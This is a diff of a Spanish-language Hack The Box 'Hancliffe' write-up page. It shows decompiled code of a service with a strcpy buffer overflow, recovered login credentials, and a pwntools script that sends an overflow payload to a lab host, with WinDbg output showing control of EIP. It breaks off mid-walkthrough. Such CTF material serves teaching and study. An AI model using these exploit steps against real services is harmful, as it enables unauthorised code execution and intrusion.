-    </span><span class="no">printf</span><span class="p">(</span><span class="s">"Send failed with error: </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">, Error);
-    closesocket(server_socket);
-    </span><span class="o">return </span><span class="mi">1</span><span class="p">;
-  }
-  </span><span class="o">else if</span><span class="p"> ( server_socket )
-  {
-    auth </span><span class="o">= </span><span class="mi">0</span><span class="p">;
-    send(server_socket, </span><span class="s">"Username: "</span><span class="p">, </span><span class="mi">10</span><span class="p">, </span><span class="mi">0</span><span class="p">);
-    recv(server_socket, buffer, </span><span class="mi">1024</span><span class="p">, </span><span class="mi">0</span><span class="p">);
-    </span><span class="no">strncpy</span><span class="p">(username, buffer, </span><span class="mi">0xA</span><span class="no">u</span><span class="p">);
-    </span><span class="no">memset</span><span class="p">(buffer, </span><span class="mi">0</span><span class="p">, </span><span class="mi">0x400</span><span class="no">u</span><span class="p">);
-    send(server_socket, </span><span class="s">"Password: "</span><span class="p">, </span><span class="mi">10</span><span class="p">, </span><span class="mi">0</span><span class="p">);
-    recv(server_socket, buffer, </span><span class="mi">1024</span><span class="p">, </span><span class="mi">0</span><span class="p">);
-    </span><span class="no">strncpy</span><span class="p">(password, buffer, </span><span class="mi">0x11</span><span class="no">u</span><span class="p">);
-    </span><span class="no">memset</span><span class="p">(buffer, </span><span class="mi">0</span><span class="p">, </span><span class="mi">0x400</span><span class="mi">u</span><span class="p">);
-    auth </span><span class="o">= </span><span class="p">login(username, password);
-    </span><span class="o">if</span><span class="p"> ( </span><span class="o">!</span><span class="p">auth )
-    {
-      send(server_socket, </span><span class="s">"Username or Password incorrect</span><span class="mi">\r\n</span><span class="s">"</span><span class="p">, </span><span class="mi">33</span><span class="p">, </span><span class="mi">0</span><span class="p">);  
-      closesocket(server_socket);
-      ExitThread(</span><span class="mi">0</span><span class="p">);
-    }
-    send(server_socket, </span><span class="s">"Login Successfully!</span><span class="mi">\r\n</span><span class="s">",</span><span class="mi"> 21</span><span class="p">, </span><span class="mi">0</span><span class="p">);
-    code </span><span class="o">= </span><span class="no">malloc</span><span class="p">(</span><span class="mi">0x50</span><span class="no">u</span><span class="p">);
-    fullname </span><span class="o">= </span><span class="no">malloc</span><span class="p">(</span><span class="mi">0x64</span><span class="no">u</span><span class="p">);
-    </span><span class="o">while</span><span class="p"> ( </span><span class="mi">true</span><span class="p"> )
-    {
-      send(server_socket, </span><span class="s">"FullName: "</span><span class="p">,</span><span class="mi"> 10</span><span class="p">, </span><span class="mi">0</span><span class="p">);
-      recv_name </span><span class="o">= </span><span class="p">recv(server_socket, buffer, </span><span class="mi">1024</span><span class="p">, </span><span class="mi">0</span><span class="p">);
-      </span><span class="o">if</span><span class="p"> ( </span><span class="o">!</span><span class="p">recv_name )
-      {
-        closesocket(server_socket);
-        ExitThread(</span><span class="mi">0</span><span class="p">);
-      }
-      </span><span class="o">if </span><span class="p">( recv_name </span><span class="o"><= </span><span class="mi">0</span><span class="p"> )
-        </span><span class="o">break</span><span class="p">;
-      </span><span class="no">memset</span><span class="p">(fullname, </span><span class="mi">0</span><span class="p">, </span><span class="mi">0x64</span><span class="no">u</span><span class="p">);
-      </span><span class="no">strncpy</span><span class="p">(fullname, buffer, </span><span class="mi">0x64</span><span class="no">u</span><span class="p">);
-      </span><span class="no">memset</span><span class="p">(buffer, </span><span class="mi">0</span><span class="p">, </span><span class="mi">0x400</span><span class="no">u</span><span class="p">);
-      send(server_socket, </span><span class="s">"Input Your Code: "</span><span class="p">, </span><span class="mi">17</span><span class="p">, </span><span class="mi">0</span><span class="p">);
-      recv(server_socket, buffer, </span><span class="mi">1024</span><span class="p">, </span><span class="mi">0</span><span class="p">);
-      </span><span class="no">memset</span><span class="p">(code, </span><span class="mi">0</span><span class="p">, </span><span class="mi">0x50</span><span class="no">u</span><span class="p">);
-      </span><span class="no">strncpy</span><span class="p">(code, buffer, </span><span class="mi">0x50</span><span class="no">u</span><span class="p">);
-      SaveCreds(code, fullname);
-      </span><span class="o">if</span><span class="p"> ( </span><span class="no">strncmp</span><span class="p">(code, </span><span class="s">"T3D83CbJkl1299"</span><span class="p">, </span><span class="mi">0xE</span><span class="no">u</span><span class="p">) )
-      {
-        send(server_socket, </span><span class="s">"Wrong Code</span><span class="mi">\r\n</span><span class="s">"</span><span class="p">, </span><span class="mi">13</span><span class="p">, </span><span class="mi">0</span><span class="p">);
-        closesocket(server_socket);
-        ExitThread(</span><span class="mi">0</span><span class="p">);
-      }
-      </span><span class="o">if</span><span class="p"> ( </span><span class="o">!</span><span class="no">strncmp</span><span class="p">(fullname, </span><span class="s">"Vickry Alfiansyah"</span><span class="p">, </span><span class="mi">0x11</span><span class="no">u</span><span class="p">) )
-      {
-        send(server_socket, </span><span class="s">"Unlocked</span><span class="mi">\r\n</span><span class="s">"</span><span class="p">, </span><span class="mi">11</span><span class="p">, </span><span class="mi">0</span><span class="p">);
-        closesocket(server_socket);
-        ExitThread(</span><span class="mi">0</span><span class="p">);
-      }
-    }
-    recv_error </span><span class="o">= </span><span class="p">WSAGetLastError();
-    </span><span class="no">printf</span><span class="p">(</span><span class="s">"Recv failed with error: </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">, recv_error);
-    closesocket(server_socket);
-    </span><span class="o">return </span><span class="mi">1</span><span class="p">;
-  }
-  </span><span class="o">return </span><span class="p">result;
-}</span>
+<code><span class="ve">❯ python3</span><span class="p"> -q
+>>> chr(0x7a - (ord("a") - 0x61))  
+'z'
+>>> chr(0x7a - (ord("b") - 0x61))  
+'y'
+>>> chr(0x7a - (ord("c") - 0x61))  
+'x'
+>>></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">login</code> retorna algunos valores, el primero es el campo <code class="language-plaintext highlighter-rouge">username</code> que se guarda en texto plano y el segundo que es <code class="language-plaintext highlighter-rouge">password</code> que esta en <code class="language-plaintext highlighter-rouge">base64</code> lo que se traduce en una cadena que pasa por las funciones <code class="language-plaintext highlighter-rouge">encrypt1</code> y <code class="language-plaintext highlighter-rouge">encrypt2</code> las cuales fueron renombradas a <code class="language-plaintext highlighter-rouge">rot47</code> y <code class="language-plaintext highlighter-rouge">atbash</code> respectivamente para ser mas descriptivas</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="na">BOOL </span><span class="p">__cdecl </span><span class="na">login</span><span class="p">(</span><span class="no">char </span><span class="o">*</span><span class="am">param_1</span><span class="p">, </span><span class="no">void </span><span class="o">*</span><span class="am">param_2</span><span class="p">)
-{
-  </span><span class="no">int </span><span class="p">len_atbash; </span><span class="c1">// eax
-  </span><span class="no">char </span><span class="p">_password[</span><span class="mi">17</span><span class="p">]; </span><span class="c1">// [esp+13h] [ebp-35h] BYREF
-  </span><span class="no">char </span><span class="o">*</span><span class="p">password_final; </span><span class="c1">// [esp+24h] [ebp-24h]
-  </span><span class="no">char </span><span class="o">*</span><span class="p">_v; </span><span class="c1">// [esp+28h] [ebp-20h]
-  </span><span class="no">char </span><span class="o">*</span><span class="p">password_atbash; </span><span class="c1">// [esp+2Ch] [ebp-1Ch]
-  </span><span class="no">int </span><span class="p">len_rot47; </span><span class="c1">// [esp+30h] [ebp-18h]
-  </span><span class="no">char </span><span class="o">*</span><span class="p">password_rot47; </span><span class="c1">// [esp+34h] [ebp-14h]
-  </span><span class="no">char </span><span class="o">*</span><span class="p">password; </span><span class="c1">// [esp+38h] [ebp-10h]
-  </span><span class="no">char </span><span class="o">*</span><span class="p">username; </span><span class="c1">// [esp+3Ch] [ebp-Ch]
-
-  </span><span class="p">username </span><span class="o">= </span><span class="s">"alfiansyah"</span><span class="p">;
-  password </span><span class="o">= </span><span class="s">"YXlYeDtsbD98eDtsWms5SyU="</span><span class="p">;
-  </span><span class="no">memmove</span><span class="p">(_password, param_2, </span><span class="mi">0x11</span><span class="no">u</span><span class="p">);
-  password_rot47 </span><span class="o">= </span><span class="p">rot47(</span><span class="mi">0</span><span class="p">, _password);
-  len_rot47 </span><span class="o">= </span><span class="no">strlen</span><span class="p">(password_rot47);
-  password_atbash </span><span class="o">= </span><span class="p">atbash(password_rot47, len_rot47);
-  _v </span><span class="o">= </span><span class="p">password_atbash;
-  len_atbash </span><span class="o">= </span><span class="no">strlen</span><span class="p">(password_atbash);
-  password_final </span><span class="o">= </span><span class="p">base64(password_atbash, len_atbash);
-  </span><span class="o">return !</span><span class="no">strcmp</span><span class="p">(username, param_1) </span><span class="o">&& !</span><span class="no">strcmp</span><span class="p">(password, password_final);  
-}</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Iniciamos con la función <code class="language-plaintext highlighter-rouge">encrypt1</code> que resumiendo su funcionamiento simplemente toma la string y rota los caracteres 47 posiciones lo que se traduce en <code class="language-plaintext highlighter-rouge">ROT47</code></p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="o">const </span><span class="no">char </span><span class="o">*</span><span class="p">__cdecl </span><span class="na">rot47</span><span class="p">(</span><span class="no">int </span><span class="am">param_1</span><span class="p">, </span><span class="no">char </span><span class="o">*</span><span class="am">param_2</span><span class="p">)  
-{
-  </span><span class="no">int </span><span class="p">character; </span><span class="c1">// [esp+10h] [ebp-18h]
-  </span><span class="na">size_t </span><span class="p">len_password; </span><span class="c1">// [esp+14h] [ebp-14h]
-  </span><span class="o">const </span><span class="no">char </span><span class="o">*</span><span class="p">password; </span><span class="c1">// [esp+18h] [ebp-10h]
-  </span><span class="na">size_t</span><span class="p"> i;</span><span class="c1"> // [esp+1Ch] [ebp-Ch]
-
-  </span><span class="p">password </span><span class="o">= </span><span class="p">strdup(param_2);
-  len_password </span><span class="o">= </span><span class="no">strlen</span><span class="p">(password);
-  </span><span class="o">for </span><span class="p">( i </span><span class="o">= </span><span class="mi">0</span><span class="p">; i</span><span class="o"> < </span><span class="p">len_password; </span><span class="o">++</span><span class="p">i )
-  {
-    </span><span class="o">if</span><span class="p"> ( password[i] </span><span class="o">> </span><span class="mi">32</span><span class="o"> && </span><span class="p">password[i] </span><span class="o">!= </span><span class="mi">127</span><span class="p"> )
-    {
-      character </span><span class="o">= </span><span class="p">password[i] </span><span class="o">+ </span><span class="mi">47</span><span class="p">;
-      </span><span class="o">if</span><span class="p"> ( character </span><span class="o"><= </span><span class="mi">126</span><span class="p"> )
-        password[i] </span><span class="o">= </span><span class="p">character;
-      </span><span class="o">else</span><span class="p">
-        password[i] </span><span class="o">-= </span><span class="mi">47</span><span class="p">;
-    }
-  }
-  </span><span class="o">return </span><span class="p">password;
-}</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">encrypt2</code> se encarga de intercambiar los caracteres de forma que <code class="language-plaintext highlighter-rouge">a</code> valga <code class="language-plaintext highlighter-rouge">z</code>, <code class="language-plaintext highlighter-rouge">b</code> valga <code class="language-plaintext highlighter-rouge">y</code>, a este tipo de cifrado tambien se le conoce como <code class="language-plaintext highlighter-rouge">Atbash</code></p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="no">char </span><span class="o">*</span><span class="p">__cdecl </span><span class="na">atbash</span><span class="p">(</span><span class="no">char </span><span class="o">*</span><span class="am">param_1</span><span class="p">, </span><span class="no">int </span><span class="am">param_2</span><span class="p">)
-{
-  </span><span class="no">char </span><span class="o">*</span><span class="p">password; </span><span class="c1">// [esp+20h] [ebp-18h]
-  </span><span class="no">int </span><span class="p">uppercase; </span><span class="c1">// [esp+24h] [ebp-14h]
-  </span><span class="no">unsigned </span><span class="na">__int8 </span><span class="p">character; </span><span class="c1">// [esp+2Bh] [ebp-Dh]
-  </span><span class="no">int </span><span class="p">i; </span><span class="c1">// [esp+2Ch] [ebp-Ch]
-
-  </span><span class="p">password </span><span class="o">= </span><span class="p">strdup(param_1);
-  </span><span class="o">for</span><span class="p"> ( i </span><span class="o">= </span><span class="mi">0</span><span class="p">; param_2 </span><span class="o">> </span><span class="p">i; </span><span class="o">++</span><span class="p">i )
-  {
-    character </span><span class="o">= </span><span class="p">param_1[i];
-    </span><span class="o">if</span><span class="p"> ( character </span><span class="o">>= </span><span class="s">'A'</span><span class="o"> && </span><span class="p">(character </span><span class="o"><=</span><span class="s"> 'Z'</span><span class="o"> || </span><span class="p">character </span><span class="o">>= </span><span class="s">'a'</span><span class="p">) </span><span class="o">&& </span><span class="p">character </span><span class="o"><= </span><span class="s">'z'</span><span class="p"> )  
-    {
-      uppercase </span><span class="o">= </span><span class="p">0;
-      </span><span class="o">if</span><span class="p"> ( character </span><span class="o"><= </span><span class="s">'Z'</span><span class="p"> )
-      {
-        character </span><span class="o">+= </span><span class="mi">32</span><span class="p">;
-        uppercase </span><span class="o">= </span><span class="mi">1</span><span class="p">;
-      }
-      password[i] </span><span class="o">= </span><span class="s">'z'</span><span class="o"> -</span><span class="p"> (character </span><span class="o">-</span><span class="s"> 'a'</span><span class="p">);
-      </span><span class="o">if</span><span class="p"> ( uppercase )
-        password[i] </span><span class="o">-= </span><span class="mi">32</span><span class="p">;
-    }
-    </span><span class="o">else</span><span class="p">
-    {
-      password[i] </span><span class="o">= </span><span class="p">character;
-    }
-  }
-  </span><span class="o">return </span><span class="p">password;
-}</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Al ser cifrados sencillos podemos decifrar la cadena ayudandonos de <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Atbash_Cipher()ROT47(47)&input=WVhsWWVEdHNiRDk4ZUR0c1dtczVTeVU9">cyberchef</a></p>
+<p class="plain-text">Al ser cifrados sencillos podemos decifrar la cadena ayudandonos de <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Atbash_Cipher()ROT47(47)&input=WVhsWWVEdHNiRDk4ZUR0c1dtczVTeVU9">cyberchef</a>, ahora tenemos el usuario y contraseña en texto plano y podemos autenticarnos</p>
 <a href="/hackthebox/hancliffe/28.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/28.png"></p></div></a>
+
+<p class="plain-text">Volvemos a <code class="language-plaintext highlighter-rouge">cHandler</code>, después de llamar a <code class="language-plaintext highlighter-rouge">auth</code> si este devuelve <code class="language-plaintext highlighter-rouge">true</code> reserva un espacio en memoria y ahora recibe el campo <code class="language-plaintext highlighter-rouge">fullname</code>, si auth devuelve <code class="language-plaintext highlighter-rouge">false</code> simplemente cierra el socket enviando un mensaje de credenciales incorrectas</p>
+<a href="/hackthebox/hancliffe/22.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/22.png"></p></div></a>
+
+<p class="plain-text">El siguiente bloque reserva un espacio en memoria esta vez para un campo <code class="language-plaintext highlighter-rouge">code</code>, luego llama a <code class="language-plaintext highlighter-rouge">SaveCreds</code> pasandole el buffer recibido como argumento, luego compara lo que esta función devuelve con la string <code class="language-plaintext highlighter-rouge">T3D83CbJkl1299</code></p>
+<a href="/hackthebox/hancliffe/24.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/24.png"></p></div></a>
+
+<p class="plain-text">Si el código correcto compara que la variable <code class="language-plaintext highlighter-rouge">fullname</code> sea igual a <code class="language-plaintext highlighter-rouge">Vickry Alfiansyah</code> para enviar el mensaje <code class="language-plaintext highlighter-rouge">Unlocked</code>, si es incorrecto envia un mensaje y cierra el socket</p>
+<a href="/hackthebox/hancliffe/25.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/25.png"></p></div></a>
 
 <p class="plain-text">Ya obtenida la contraseña podemos autenticarnos al servicio con todos los datos que hemos conseguido, y aunque nos dice <code class="language-plaintext highlighter-rouge">Unlocked</code> no podemos hacer nada</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
@@ -765,32 +532,13 @@ Input Your Code: T3D83CbJkl1299
 Unlocked</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Podemos ver una función llamada <code class="language-plaintext highlighter-rouge">SaveCreds</code> que usa <code class="language-plaintext highlighter-rouge">strcpy</code> para copiar los valores de FullName y <code class="language-plaintext highlighter-rouge">Code</code> sin embargo para el codigo define un buffer de apenas <code class="language-plaintext highlighter-rouge">50</code> bytes, esto combinado con la funcion vulnerable resulta en un <code class="language-plaintext highlighter-rouge">Buffer Overflow</code></p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="no">char </span><span class="o">*</span><span class="p">__cdecl </span><span class="na">SaveCreds</span><span class="p">(</span><span class="no">char </span><span class="o">*</span><span class="am">param_1</span><span class="p">, </span><span class="no">char </span><span class="o">*</span><span class="am">param_2</span><span class="p">)  
-{
-  </span><span class="no">char </span><span class="p">code[</span><span class="mi">50</span><span class="p">];</span><span class="c1"> // [esp+1Ah] [ebp-3Eh] BYREF
-  </span><span class="no">char </span><span class="o">*</span><span class="p">fullname; </span><span class="c1">// [esp+4Ch] [ebp-Ch]
+<p class="plain-text">Si revisamos la función <code class="language-plaintext highlighter-rouge">SaveCreds</code> que recibe el código copia este código a un destino que se encuentra en <code class="language-plaintext highlighter-rouge">ebp - 62</code>, esto es importante porque si enviamos un payload mayor a eso ocasionaremos un buffer overflow sobrescribiendo otros datos</p>
+<a href="/hackthebox/hancliffe/26.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/26.png"></p></div></a>
 
-  </span><span class="p">fullname </span><span class="o">= </span><span class="no">malloc</span><span class="p">(</span><span class="mi">0x64</span><span class="no">u</span><span class="p">);
-  </span><span class="no">strcpy</span><span class="p">(fullname, param_2);
-  </span><span class="o">return </span><span class="no">strcpy</span><span class="p">(code, param_1);
-}</span>
-</code></pre></div></div><br>
+<p class="plain-text">Para poder debuggear el ejecutable ejecutaremos la aplicación dentro <code class="language-plaintext highlighter-rouge">WinDbg</code></p>
+<a href="/hackthebox/hancliffe/27.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/27.png"></p></div></a>
 
-<p class="plain-text">Para debuggear el binario usaremos <a href="https://x64dbg.com/">x32dbg</a> con el plugin <a href="https://github.com/x64dbg/x64dbgpy">x64dbgpy</a> y el modulo <a href="https://github.com/corelan/mona">mona</a>, asi que abrimos el exe <code class="language-plaintext highlighter-rouge">exe</code> y lo corremos, ademas de importar el modulo</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">from mona import mona</span>
-</code></pre></div></div><br>
-<a href="/hackthebox/hancliffe/9.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/9.png"></p></div></a>
-
-<p class="plain-text">Necesitamos saber la cantidad de <code class="language-plaintext highlighter-rouge">bytes</code> necesarios antes de llegar a <code class="language-plaintext highlighter-rouge">EIP</code> ya que sera nuestro puntero, creamos una cadena de <code class="language-plaintext highlighter-rouge">100</code> bytes usando <code class="language-plaintext highlighter-rouge">pattern_create</code></p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">mona("pattern_create 100")</span>
-</code></pre></div></div><br>
-<a href="/hackthebox/hancliffe/10.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/10.png"></p></div></a>
-
-<p class="plain-text">Creamos un script que se autentique y envie la cadena especialmente diseñada para encontrar un <code class="language-plaintext highlighter-rouge">offset</code>, corremos el programa y vemos que este se corrompe</p>
+<p class="plain-text">Si el buffer reservado para el código se encuentra en <code class="language-plaintext highlighter-rouge">ebp - 62</code> enviaremos <code class="language-plaintext highlighter-rouge">A's</code> para llenar ese buffer, luego enviaremos <code class="language-plaintext highlighter-rouge">4 B's</code> para el valor que tomará <code class="language-plaintext highlighter-rouge">ebp</code>, <code class="language-plaintext highlighter-rouge">4 C's</code> que sobrescribirán la dirección de retorno y <code class="language-plaintext highlighter-rouge">30 D's</code> que solo se guardarán en el stack</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3</span><span class="p">
 </span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, log, sys
@@ -799,101 +547,123 @@ Unlocked</span>
     log.failure(</span><span class="no">f</span><span class="s">"Usage: python3 </span><span class="p">{sys.argv[</span><span class="mi">0</span><span class="p">]}</span><span class="s"> &ltport>"</span><span class="p">)
     sys.exit(</span><span class="mi">1</span><span class="p">)
 
-pattern </span><span class="o">= </span><span class="no">b</span><span class="s">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"</span><span class="p">  
+payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 62</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"D"</span><span class="o"> *</span><span class="mi"> 30</span><span class="p">
 
 shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, sys.argv[</span><span class="mi">1</span><span class="p">])
 
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"Username: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"alfiansyah"</span><span class="p">)
-shell.sendlineafter(</span><span class="no">b</span><span class="s">"Password: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"K3r4j@@nM4j@pAh!T"</span><span class="p">)
-shell.sendlineafter(</span><span class="no">b</span><span class="s">"FullName: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"Vickry Alfiansyah"</span><span class="p">)
-shell.sendlineafter(</span><span class="no">b</span><span class="s">"Input Your Code: "</span><span class="p">, pattern)</span>
-</code></pre></div></div><br>
-
-<a href="/hackthebox/hancliffe/11.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/11.png"></p></div></a>
-
-<p class="plain-text">Lo que haremos sera usar <code class="language-plaintext highlighter-rouge">pattern_offset</code> para encontrar el offset o bytes basura necesarios, le pasamos como argumento el valor de <code class="language-plaintext highlighter-rouge">EIP</code> y nos dice que son <code class="language-plaintext highlighter-rouge">66</code></p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">mona("pattern_offset 41326341")</span>
-</code></pre></div></div><br>
-<a href="/hackthebox/hancliffe/12.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/12.png"></p></div></a>
-
-<p class="plain-text">Para comprobarlo en el script enviaremos <code class="language-plaintext highlighter-rouge">66 A's</code> que son las necesarias antes de EIP seguidos de <code class="language-plaintext highlighter-rouge">4 B's</code> que si el calculo es correcto deberia sobreescribir <code class="language-plaintext highlighter-rouge">EIP</code></p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="c1">#!/usr/bin/python3
-</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, log, sys
-
-</span><span class="o">if </span><span class="no">len</span><span class="p">(sys.argv) </span><span class="o">< </span><span class="mi">2</span><span class="p">:
-    log.failure(</span><span class="no">f</span><span class="s">"Usage: python3 </span><span class="p">{sys.argv[</span><span class="mi">0</span><span class="p">]}</span><span class="s"> &ltport>"</span><span class="p">)  
-    sys.exit(</span><span class="mi">1</span><span class="p">)
-
-offset </span><span class="o">= </span><span class="mi">66</span><span class="p">
-junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
-eip </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">
-
-payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">eip
-
-shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, sys.argv[</span><span class="mi">1</span><span class="p">])
-
-shell.sendlineafter(</span><span class="no">b</span><span class="s">"Username: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"alfiansyah"</span><span class="p">)
-shell.sendlineafter(</span><span class="no">b</span><span class="s">"Password: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"K3r4j@@nM4j@pAh!T"</span><span class="p">)
-shell.sendlineafter(</span><span class="no">b</span><span class="s">"FullName: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"Vickry Alfiansyah"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Password: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"K3r4j@@nM4j@pAh!T"</span><span class="p">)  
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"FullName: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"Vickry Alfiansyah"</span><span class="p">)  
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"Input Your Code: "</span><span class="p">, payload)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Esta vez sobreescribimos el registro <code class="language-plaintext highlighter-rouge">EIP</code> pero tenemos el control del puntero que ahora tiene como valor <code class="language-plaintext highlighter-rouge">42424242</code> que es la representacion en hexadecimal de <code class="language-plaintext highlighter-rouge">BBBB</code></p>
-<a href="/hackthebox/hancliffe/13.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/13.png"></p></div></a>
-
-<p class="plain-text">Lo siguiente sera listar <code class="language-plaintext highlighter-rouge">modulos</code> donde vemos que el programa no tiene protecciones</p>
+<p class="plain-text">Algo a tener en cuenta es que como vimos al reversear el puerto es dinamico por lo que es mas sencillo pasarle el puerto al script simplemente como un argumento</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">mona("modules")</span>
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py 9217
+[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 9217: Done  
+[</span><span class="az">*</span><span class="p">] Closed connection to 192.168.100.5 port 9217</span>
 </code></pre></div></div><br>
-<a href="/hackthebox/hancliffe/14.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/14.png"></p></div></a>
 
-<p class="plain-text">Para poder ejecutar nuestro shellcode sera necesario hacer un <code class="language-plaintext highlighter-rouge">jmp esp</code>, con mona buscamos una direccion que ejecute esa intruccion y en el exe encontramos varias</p>
+<p class="plain-text">Al ejecutar el exploit podemos ver que las <code class="language-plaintext highlighter-rouge">B's</code> sobrescriben el valor de <code class="language-plaintext highlighter-rouge">ebp</code> y las <code class="language-plaintext highlighter-rouge">C's</code> sobrescriben el retorno, sin embargo solo hay una cosa que no se representó correctamente y es que de las <code class="language-plaintext highlighter-rouge">30 D's</code> enviadas solo se guardaron <code class="language-plaintext highlighter-rouge">10</code> en el stack</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">mona("jmp -r esp -m myfirstapp.exe")</span>
-</code></pre></div></div><br>
-<a href="/hackthebox/hancliffe/15.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/15.png"></p></div></a>
+<code><span class="ro">0:000></span><span class="p"> g
+(2bb8.1a84): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00d6fed6 ebx=0000015c ecx=007b3db4 edx=00000000 esi=71901a3d edi=71901a3d  
+eip=43434343 esp=00d6ff1c ebp=42424242 iopl=0         nv up ei pl zr na pe nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246  
+43434343 ??              ???
 
-<p class="plain-text">Tenemos un problema, y es que si despues de saltar al ESP enviamos <code class="language-plaintext highlighter-rouge">50 A's</code> aunque el programa corrompe si revisamos la pila solo se logran almacenar <code class="language-plaintext highlighter-rouge">8</code> bytes que no nos sirven para nada ya que generalmente los shellcodes tienen mas de <code class="language-plaintext highlighter-rouge">200</code></p>
+</span><span class="ro">0:000></span><span class="p"> r ebp
+ebp=42424242
+
+</span><span class="ro">0:000></span><span class="p"> r eip
+eip=43434343
+
+</span><span class="ro">0:000></span><span class="p"> db esp
+00d6ff1c  44 44 44 44 44 44 44 44-44 44 ab ab ab ab ab ab  DDDDDDDDDD......
+00d6ff2c  ab ab 00 00 00 00 00 00-00 4b 33 72 34 6a 40 40  .........K3r4j@@
+00d6ff3c  6e 4d 34 6a 40 70 41 68-21 54 61 6c 66 69 61 6e  nM4j@pAh!Talfian
+00d6ff4c  73 79 61 68 12 00 00 00-c0 3d 7b 00 58 3d 7b 00  syah.....={.X={.
+00d6ff5c  01 00 00 00 1d 00 00 00-5c 01 00 00 10 39 7b 00  ........\....9{.
+00d6ff6c  00 00 00 00 00 00 00 00-84 ff d6 00 a9 7b 8a 77  .............{.w
+00d6ff7c  5c 01 00 00 90 7b 8a 77-dc ff d6 00 0b c1 a1 77  \....{.w.......w
+00d6ff8c  5c 01 00 00 f0 89 50 5f-00 00 00 00 00 00 00 00  \.....P_........</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Solo <code class="language-plaintext highlighter-rouge">10</code> bytes es muy poco incluso para otras técnicas como egghunters, por suerte según <a href="https://learn.microsoft.com/es-es/cpp/c-runtime-library/reference/strcpy-wcscpy-mbscpy?view=msvc-170#return-value">documentación</a> oficial de microsoft <code class="language-plaintext highlighter-rouge">strcpy</code> retorna un puntero al buffer de destino por lo que en <code class="language-plaintext highlighter-rouge">eax</code> se almacena la dirección del inicio de nuestro payload</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
